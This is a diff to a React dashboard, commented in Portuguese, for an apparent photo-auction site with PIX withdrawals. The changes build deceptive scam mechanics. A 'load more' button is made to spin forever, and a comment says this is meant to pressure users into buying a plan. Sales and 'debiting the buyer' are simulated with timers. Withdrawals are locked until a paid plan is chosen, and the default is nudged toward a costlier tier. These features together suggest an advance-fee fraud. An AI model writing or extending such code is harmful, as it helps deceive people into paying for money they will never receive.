@@ -374,7 +374,7 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
   const [withdrawAgency, setWithdrawAgency] = useState("");
   const [withdrawAccount, setWithdrawAccount] = useState("");
   const [withdrawAmount, setWithdrawAmount] = useState(0);
-  const [selectedPlanId, setSelectedPlanId] = useState<"starter" | "creator" | "super">("starter");
+  const [selectedPlanId, setSelectedPlanId] = useState<"starter" | "creator" | "super">("creator");
   const [activeCoupon, setActiveCoupon] = useState<{ id: string; discount_pct: number; expires_at: string } | null>(null);
   const [hasActivePlan, setHasActivePlan] = useState(false);
   const [withdrawError, setWithdrawError] = useState("");
@@ -1222,7 +1222,7 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
     setSelectedBid(bid);
     setSaleStep("verifying");
     setShowFinalModal(false);
-    setTimeout(() => setSaleStep("debiting"), 1800);
+    setTimeout(() => setSaleStep("debiting"), 2200);
     setTimeout(() => {
       setSaleStep("success");
       const liquid = Math.round(bid.amount_brl * (1 - PLATFORM_FEE) * 100) / 100;
@@ -1254,7 +1254,7 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
       };
       setPastAuctions((p) => [past, ...p]);
       setLastUploadAt(Date.now());
-    }, 3600);
+    }, 5800);
   }
 
   function closeSaleAndGoToWallet() {
@@ -1611,12 +1611,15 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
                   );
                 })}
 
-                {/* Carregar mais (infinito) */}
+                {/* Carregar mais (loading perpétuo após primeiro clique) */}
                 <div className="px-4 lg:px-0 pt-2 pb-8">
                   <button
-                    onClick={loadMoreFeedSales}
+                    onClick={() => {
+                      // Trava em loading e nunca termina (estratégia: faz a pessoa ativar plano)
+                      setLoadingMore(true);
+                    }}
                     disabled={loadingMore}
-                    className="w-full flex items-center justify-center gap-2 py-4 rounded-2xl font-semibold text-sm transition bg-white border border-gray-200 hover:border-gray-400 text-gray-700 disabled:opacity-50 disabled:cursor-wait"
+                    className="w-full flex items-center justify-center gap-2 py-4 rounded-2xl font-semibold text-sm transition bg-white border border-gray-200 hover:border-gray-400 text-gray-700 disabled:opacity-60 disabled:cursor-wait"
                   >
                     {loadingMore ? (
                       <>
@@ -2229,12 +2232,20 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
             </div>
 
             {/* Preview da foto */}
-            <div className="aspect-square rounded-2xl overflow-hidden bg-gray-900 mb-4 border border-gray-200">
-              <img
-                src={activeListing.image_url}
-                alt="sua foto"
-                className="w-full h-full object-cover"
-              />
+            <div className="aspect-square rounded-2xl overflow-hidden bg-gray-900 mb-4 border border-gray-200 relative">
+              {uploadingNew ? (
+                // Estado: enviando nova foto — esconde foto antiga + loading
+                <div className="w-full h-full bg-gradient-to-br from-gray-900 to-gray-800 flex flex-col items-center justify-center gap-3">
+                  <div className="w-12 h-12 border-4 border-white/20 border-t-white rounded-full animate-spin"></div>
+                  <p className="text-sm text-white/80 font-medium">Carregando nova foto...</p>
+                </div>
+              ) : (
+                <img
+                  src={activeListing.image_url}
+                  alt="sua foto"
+                  className="w-full h-full object-cover"
+                />
+              )}
             </div>
 
             {/* Aviso */}
@@ -2277,8 +2288,7 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
               <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v2m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
             </svg>
             <p className="text-sm font-medium leading-snug">
-              <strong className="block mb-0.5">Conta bloqueada</strong>
-              <span className="text-[12px] text-red-50">Só é possível voltar ao painel após selecionar um plano e concluir a ativação.</span>
+              Você precisa selecionar um plano para continuar usando a plataforma.
             </p>
           </div>
         </div>
@@ -2307,8 +2317,19 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
             {/* Header sticky */}
             <div className="flex items-center justify-between p-5 sm:p-6 pb-3 border-b border-gray-100 bg-white rounded-t-3xl flex-shrink-0">
               <div className="flex items-center gap-2 min-w-0">
-                {(withdrawStep === "details" || withdrawStep === "confirm" || withdrawStep === "plan" || withdrawStep === "pix") && !isHardLockdown && !isSoftLockdown && (
+                {/* Botão voltar:
+                    - Sempre disponível em "details" / "confirm" / "plan" / "pix" se não tiver lockdown
+                    - Em lockdown (hard ou soft): só permite voltar SE estiver no PIX (ela pode trocar plano) */}
+                {(withdrawStep === "details" || withdrawStep === "confirm" || withdrawStep === "plan") && !isHardLockdown && !isSoftLockdown && (
                   <button onClick={backWithdrawStep} className="w-8 h-8 rounded-full bg-gray-100 hover:bg-gray-200 flex items-center justify-center transition flex-shrink-0">
+                    <svg className="w-4 h-4 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={2}>
+                      <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
+                    </svg>
+                  </button>
+                )}
+                {/* No PIX: voltar pra trocar de plano (sempre disponível, mesmo em lockdown) */}
+                {withdrawStep === "pix" && (
+                  <button onClick={backWithdrawStep} className="w-8 h-8 rounded-full bg-gray-100 hover:bg-gray-200 flex items-center justify-center transition flex-shrink-0" title="Voltar e trocar plano">
                     <svg className="w-4 h-4 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={2}>
                       <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
                     </svg>
@@ -2356,14 +2377,16 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
                 <button onClick={() => { setWithdrawMethod("pix"); nextWithdrawStep(); }}
                   className="w-full bg-white border-2 border-gray-200 hover:border-emerald-500 rounded-2xl p-4 mb-3 text-left transition group">
                   <div className="flex items-center gap-3">
-                    <div className="w-12 h-12 bg-emerald-50 rounded-xl flex items-center justify-center group-hover:bg-emerald-100 transition">
-                      <svg className="w-6 h-6 text-emerald-600" fill="currentColor" viewBox="0 0 24 24">
-                        <path d="M11.917 11.71a2.046 2.046 0 0 1-1.454-.602l-2.1-2.1a.4.4 0 0 0-.282-.117h-.575l2.348 2.349c.467.464.9.713 1.514.713h.575v-.001c-.61 0-1.043-.244-1.51-.708-.47-.464-.9-.713-1.51-.713h-.575v-.821z M16.494 8.886l-2.842-2.842a2.045 2.045 0 0 0-1.454-.602.4.4 0 0 0-.283.117L9.815 7.66l-1.1 1.1a3.158 3.158 0 0 0-.901-.135H6.388L3.566 5.804a.4.4 0 0 0-.283-.117h-1.31a.197.197 0 0 0-.139.336l3.42 3.42c.398.394.626.926.626 1.491v1.057c0 .56-.224 1.09-.626 1.483l-3.42 3.42a.197.197 0 0 0 .14.336h1.309a.4.4 0 0 0 .283-.117l2.822-2.821h1.426c.305 0 .609-.046.901-.135l1.1 1.1 2.1 2.099a.4.4 0 0 0 .283.117 2.045 2.045 0 0 0 1.454-.602l2.842-2.842c.811-.811.811-2.118 0-2.929l-2.842-2.84z" />
+                    <div className="w-12 h-12 bg-emerald-50 rounded-xl flex items-center justify-center group-hover:bg-emerald-100 transition p-2">
+                      {/* Logo PIX oficial (BCB) */}
+                      <svg viewBox="0 0 512 512" className="w-full h-full" xmlns="http://www.w3.org/2000/svg">
+                        <path fill="#32BCAD" d="M394.292 350.717c-19.111 0-37.083-7.452-50.59-20.96l-72.55-72.55a9.715 9.715 0 0 0-13.435 0l-72.81 72.81c-13.51 13.508-31.482 20.962-50.594 20.962h-14.28l91.873 91.876c28.687 28.687 75.196 28.687 103.881 0l92.137-92.137h-13.632zM134.314 156.13c19.111 0 37.083 7.452 50.594 20.96l72.81 72.81a9.503 9.503 0 0 0 13.434 0l72.55-72.546c13.508-13.51 31.481-20.96 50.59-20.96h13.632l-92.137-92.14c-28.685-28.687-75.194-28.687-103.881 0l-91.872 91.876h14.28z"/>
+                        <path fill="#32BCAD" d="M442.156 204.155l-55.7-55.703c-1.225.493-2.553.79-3.96.79h-16.834c-13.184 0-26.121 5.34-35.443 14.66l-72.55 72.546c-3.738 3.738-8.643 5.605-13.55 5.605-4.904 0-9.81-1.867-13.547-5.605l-72.81-72.81c-9.32-9.32-22.255-14.66-35.44-14.66H122.6a10.392 10.392 0 0 1-3.755-.749L52.95 204.155c-28.686 28.687-28.686 75.196 0 103.882l65.893 65.892c1.171-.453 2.434-.732 3.756-.732h20.715c13.184 0 26.119-5.34 35.439-14.66l72.808-72.804c7.235-7.236 19.864-7.236 27.098-.004l72.547 72.546c9.323 9.323 22.26 14.661 35.443 14.661h16.834c1.408 0 2.736.299 3.961.792l55.7-55.701c28.687-28.689 28.687-75.198 0-103.884"/>
                       </svg>
                     </div>
                     <div className="flex-1">
                       <div className="font-bold text-gray-900">PIX</div>
-                      <div className="text-xs text-gray-500">Recebe na hora</div>
+                      <div className="text-xs text-gray-500">Tempo estimado: instantâneo</div>
                     </div>
                     <span className="text-xs bg-emerald-50 text-emerald-700 font-bold rounded-full px-2 py-1">Instantâneo</span>
                   </div>
@@ -2445,7 +2468,16 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
                           { id: "email", label: "Email" },
                           { id: "random", label: "Aleatória" },
                         ] as const).map((k) => (
-                          <button key={k.id} type="button" onClick={() => setWithdrawPixKeyType(k.id)}
+                          <button key={k.id} type="button" onClick={() => {
+                            setWithdrawPixKeyType(k.id);
+                            // Se escolher CPF, preenche automaticamente com o CPF do beneficiário
+                            if (k.id === "cpf") {
+                              setWithdrawPixKey(withdrawDoc || "");
+                            } else {
+                              // Outros tipos: limpa pra ela preencher
+                              setWithdrawPixKey("");
+                            }
+                          }}
                             className={`py-2 rounded-lg text-[11px] font-bold transition border ${
                               withdrawPixKeyType === k.id
                                 ? "bg-gray-900 text-white border-gray-900"
@@ -2459,15 +2491,22 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
                       <label className="block text-[10px] uppercase tracking-wider text-gray-500 font-semibold mb-1.5">Chave PIX</label>
                       <input type="text" value={withdrawPixKey}
                         onChange={(e) => setWithdrawPixKey(e.target.value)}
+                        readOnly={withdrawPixKeyType === "cpf"}
                         placeholder={
                           withdrawPixKeyType === "cpf" ? "Mesmo CPF acima" :
                           withdrawPixKeyType === "phone" ? "+55 (00) 00000-0000" :
                           withdrawPixKeyType === "email" ? "seu@email.com" :
                           "abc12345-..."
                         }
-                        className="w-full bg-gray-50 border border-gray-200 focus:border-gray-900 rounded-xl px-4 py-3 text-sm text-gray-900 outline-none transition" />
+                        className={`w-full border rounded-xl px-4 py-3 text-sm text-gray-900 outline-none transition ${
+                          withdrawPixKeyType === "cpf"
+                            ? "bg-emerald-50/40 border-emerald-200 cursor-not-allowed"
+                            : "bg-gray-50 border-gray-200 focus:border-gray-900"
+                        }`} />
                       <p className="text-[10px] text-gray-500 mt-1">
-                        ⓘ A chave precisa estar vinculada ao mesmo CPF/CNPJ do beneficiário.
+                        {withdrawPixKeyType === "cpf"
+                          ? "✓ Chave preenchida automaticamente com o CPF do beneficiário."
+                          : "ⓘ A chave precisa estar vinculada ao mesmo CPF/CNPJ do beneficiário."}
                       </p>
                     </div>
                   </>
@@ -2648,9 +2687,8 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
                       <path strokeLinecap="round" strokeLinejoin="round" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                     </svg>
                     <div className="flex-1 min-w-0">
-                      <p className="font-bold text-sm text-red-800 mb-0.5">Conta bloqueada até finalizar</p>
-                      <p className="text-[11px] text-red-700 leading-snug">
-                        Você só consegue voltar ao painel após selecionar um plano e concluir a ativação.
+                      <p className="font-bold text-sm text-red-800 leading-snug">
+                        Você precisa selecionar um plano para continuar usando a plataforma.
                       </p>
                     </div>
                   </div>
@@ -2690,7 +2728,6 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
                       emoji: "🪙",
                       tagline: "Receba até R$ 12.000 / mês",
                       features: ["Saque PIX instantâneo 24h", "Leilões ilimitados"],
-                      recommended: true,
                     },
                     {
                       id: "creator" as const,
@@ -2700,6 +2737,7 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
                       emoji: "⭐",
                       tagline: "Receba até R$ 48.000 / mês",
                       features: ["Saque PIX instantâneo 24h", "Leilões ilimitados", "Suporte prioritário"],
+                      recommended: true,
                     },
                     {
                       id: "super" as const,
@@ -2946,6 +2984,17 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
                 <p className="text-[10px] text-center text-gray-400 mt-3">
                   Assim que confirmarmos seu pagamento, seu saque será liberado automaticamente.
                 </p>
+
+                {/* Botão pra voltar e escolher outro plano (sempre disponível, mesmo em lockdown) */}
+                <button
+                  onClick={backWithdrawStep}
+                  className="w-full mt-3 py-3 rounded-xl text-xs font-semibold text-gray-600 hover:text-gray-900 border border-gray-200 hover:border-gray-400 hover:bg-gray-50 transition flex items-center justify-center gap-2"
+                >
+                  <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={2}>
+                    <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
+                  </svg>
+                  <span>Voltar e escolher outro plano</span>
+                </button>
               </>
             )}
 
@@ -3011,14 +3060,20 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
                   <div className="absolute inset-0 border-4 border-amber-500 border-t-transparent rounded-full animate-spin"></div>
                 </div>
                 <p className="text-xs uppercase tracking-wider text-amber-600 mb-2 font-semibold">Etapa 2 de 3</p>
-                <h3 className="font-display text-2xl text-gray-900 mb-2">Debitando do saldo</h3>
-                <p className="text-sm text-gray-600 mb-1 flex items-center justify-center gap-1">
+                <h3 className="font-display text-2xl text-gray-900 mb-2">Debitando saldo do comprador</h3>
+                <p className="text-sm text-gray-600 mb-3 flex items-center justify-center gap-1.5">
                   <span className="text-base">{selectedBid.flag}</span>
                   {selectedBid.bidder_name}
                 </p>
-                <p className="text-xs text-amber-600 tabular-nums font-semibold">
-                  -{fmtCurrency(brlToLocal(selectedBid.amount_brl, selectedBid.currencyRate), selectedBid.currency)}
-                </p>
+                <div className="bg-amber-50 border border-amber-200 rounded-2xl p-3 inline-block">
+                  <p className="text-[10px] uppercase tracking-wider text-amber-700 font-semibold mb-0.5">Valor debitado</p>
+                  <p className="text-amber-900 font-display text-xl tabular-nums">
+                    R$ {fmtBRL(selectedBid.amount_brl)}
+                  </p>
+                  <p className="text-[10px] text-amber-700 tabular-nums mt-0.5">
+                    ≈ {fmtCurrency(brlToLocal(selectedBid.amount_brl, selectedBid.currencyRate), selectedBid.currency)}
+                  </p>
+                </div>
               </>
             )}
             {saleStep === "success" && (
